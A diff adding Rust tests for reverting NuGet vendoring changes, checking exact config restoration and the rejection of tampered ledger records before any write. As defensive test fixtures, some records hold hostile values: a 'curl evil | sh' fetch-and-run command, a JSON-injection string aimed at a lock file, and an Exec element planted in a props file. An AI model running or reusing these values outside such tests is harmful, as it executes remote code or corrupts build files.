+            let (dir, blobs, installed, record) = fixture(true, Some(orig_cfg)).await;
+            let root = dir.path();
+            let (_r, entry, _w) =
+                unwrap_done(run_vendor(root, &blobs, &installed, &record, false).await);
+            let mut entry = entry.unwrap();
+            entry.wiring[0].original = Some(Value::String(evil.clone()));
+
+            let outcome = revert_nuget(&entry, root, false).await;
+            assert!(outcome.success, "{:?}", outcome.error);
+            let after = tokio::fs::read_to_string(root.join("nuget.config"))
+                .await
+                .unwrap();
+            assert_ne!(after, evil, "the ledger's text is not written");
+            assert!(!after.contains("evil"), "{after}");
+            assert!(
+                after.contains("key=\"nuget.org\"") && after.contains("nuget.corp.example"),
+                "{after}"
+            );
+            assert!(!after.contains(&source_key()), "our source is excised: {after}");
+        }
+    }
+
+    /// The whole-file restore still covers what vendoring does to a config
+    /// it finds: sections it creates, empty self-closing ones it opens, a
+    /// mapping it extends — each reverts byte for byte, with no drift.
+    #[tokio::test]
+    async fn revert_is_exact_for_the_config_shapes_vendoring_extends() {
+        for config in [
+            "<configuration>\n</configuration>\n",
+            "<configuration>\n  <packageSources />\n  <packageSourceMapping />\n</configuration>\n",
+            "<configuration>\n  <packageSources/>\n</configuration>\n",
+            "<configuration>\n  <packageSources>\n    <add key=\"corp\" value=\"https://nuget.corp.example/v3/index.json\" />\n  </packageSources>\n  <packageSourceMapping>\n    <packageSource key=\"corp\">\n      <package pattern=\"Corp.*\" />\n    </packageSource>\n  </packageSourceMapping>\n</configuration>\n",
+            "<configuration>\r\n  <packageSources>\r\n    <add key=\"corp\" value=\"https://nuget.corp.example/v3/index.json\" />\r\n  </packageSources>\r\n</configuration>\r\n",
+        ] {
+            let (dir, blobs, installed, record) = fixture(true, Some(config)).await;
+            let root = dir.path();
+            let (_r, entry, _w) =
+                unwrap_done(run_vendor(root, &blobs, &installed, &record, false).await);
+            let outcome = revert_nuget(&entry.unwrap(), root, false).await;
+            assert!(outcome.success, "{config}: {:?}", outcome.error);
+            assert!(outcome.warnings.is_empty(), "{config}: {:?}", outcome.warnings);
+            assert_eq!(
+                tokio::fs::read_to_string(root.join("nuget.config"))
+                    .await
+                    .unwrap(),
+                config
+            );
+        }
+    }
+
+    /// A record that says vendoring created the config deletes it only when
+    /// every line of it is one vendoring writes.
+    #[tokio::test]
+    async fn a_created_config_record_never_deletes_a_user_config() {
+        let orig_cfg = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\
+                        <configuration>\n\
+                        \x20 <packageSources>\n\
+                        \x20   <add key=\"corp\" value=\"https://nuget.corp.example/v3/index.json\" />\n\
+                        \x20 </packageSources>\n\
+                        </configuration>\n";
+        let (dir, blobs, installed, record) = fixture(true, Some(orig_cfg)).await;
+        let root = dir.path();
+        let (_r, entry, _w) =
+            unwrap_done(run_vendor(root, &blobs, &installed, &record, false).await);
+        let mut entry = entry.unwrap();
+        entry.wiring[0].action = WiringAction::Added;
+        entry.wiring[0].original = None;
+
+        let outcome = revert_nuget(&entry, root, false).await;
+        assert!(outcome.success, "{:?}", outcome.error);
+        let after = tokio::fs::read_to_string(root.join("nuget.config"))
+            .await
+            .unwrap();
+        assert!(after.contains("nuget.corp.example"), "{after}");
+        assert!(!after.contains(&source_key()), "{after}");
+    }
+
+    /// The records of an entry are checked before the first write: a config
+    /// record for another file or another source, or a lock record that is
+    /// no contentHash swap in a NuGet lock, fails the revert untouched.
+    #[tokio::test]
+    async fn records_that_are_not_this_backends_fail_before_any_write() {
+        let orig_cfg =
+            "<configuration>\n  <packageSources>\n  </packageSources>\n</configuration>\n";
+        let record_of =
+            |file: &str, kind: &str, key: &str, original: &str, new: &str| WiringRecord {
+                file: file.to_string(),
+                kind: kind.to_string(),
+                action: WiringAction::Rewritten,
+                key: Some(key.to_string()),
+                original: Some(Value::String(original.to_string())),
+                new: Some(Value::String(new.to_string())),
+            };
+        let props = "<Project />\n";
+        for tampered in [
+            record_of(
+                "Directory.Build.props",
+                CONFIG_SOURCE_WIRING_KIND,
+                &source_key(),
+                "<Project><Exec /></Project>\n",
+                props,
+            ),
+            record_of(
+                "nuget.config",
+                CONFIG_SOURCE_WIRING_KIND,
+                "nuget.org",
+                orig_cfg,
+                orig_cfg,
+            ),
+            record_of(
+                "tools/build.json",
+                LOCK_WIRING_KIND,
+                "Newtonsoft.Json",
+                "curl evil | sh",
+                "make",
+            ),
+            record_of(
+                PACKAGES_LOCK,
+                LOCK_WIRING_KIND,
+                "Newtonsoft.Json",
+                "x\", \"resolved\": \"9.9.9",
+                "B==",
+            ),
+            record_of(
+                ".github/packages.lock.json",
+                LOCK_WIRING_KIND,
+                "Newtonsoft.Json",
+                "A==",
+                "B==",
+            ),
+        ] {
+            let (dir, blobs, installed, record) = fixture(true, Some(orig_cfg)).await;
+            let root = dir.path();
+            tokio::fs::write(root.join("Directory.Build.props"), props)
+                .await
+                .unwrap();
+            tokio::fs::create_dir_all(root.join("tools")).await.unwrap();
+            tokio::fs::write(root.join("tools/build.json"), "{\"build\": \"make\"}\n")
+                .await
+                .unwrap();
+            let (_r, entry, _w) =
+                unwrap_done(run_vendor(root, &blobs, &installed, &record, false).await);
+            let mut entry = entry.unwrap();
+            entry.wiring.push(tampered.clone());
+            let before = (
+                tokio::fs::read_to_string(root.join("nuget.config"))
+                    .await
+                    .unwrap(),
+                tokio::fs::read_to_string(root.join(PACKAGES_LOCK))
+                    .await
+                    .unwrap(),
+            );
+
+            let outcome = revert_nuget(&entry, root, false).await;
+            assert!(!outcome.success, "{tampered:?}");
+            let error = outcome.error.unwrap_or_default();
+            assert!(error.contains("ledger record"), "{error}");
+            let after = (
+                tokio::fs::read_to_string(root.join("nuget.config"))
+                    .await
+                    .unwrap(),
+                tokio::fs::read_to_string(root.join(PACKAGES_LOCK))
+                    .await
+                    .unwrap(),
+            );
+            assert_eq!(after, before, "nothing is written: {tampered:?}");
+            assert_eq!(
+                tokio::fs::read_to_string(root.join("Directory.Build.props"))
+                    .await
+                    .unwrap(),
+                props
+            );
+            assert!(root.join(format!(".socket/vendor/nuget/{UUID}")).exists());
+        }
     }
 }
